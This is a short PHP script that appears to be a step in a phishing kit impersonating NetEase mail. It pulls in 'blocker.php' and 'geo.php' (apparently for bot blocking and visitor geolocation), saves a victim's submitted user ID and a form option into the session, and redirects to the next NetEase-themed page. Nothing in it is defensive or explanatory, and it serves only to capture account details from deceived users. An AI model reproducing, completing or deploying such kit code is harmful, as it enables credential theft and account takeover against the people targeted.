<?php
session_start();
ob_start();
include "blocker.php";
include "geo.php";
$subemail=$_SESSION['subemail'];
$radiobtn =$_SESSION['radiobtn']= $_POST['DisconnectProofOption'];
$_SESSION['userid'] = $email =$_POST['userid'];

header("Location: /netease/redirect/redirect.php?")
?>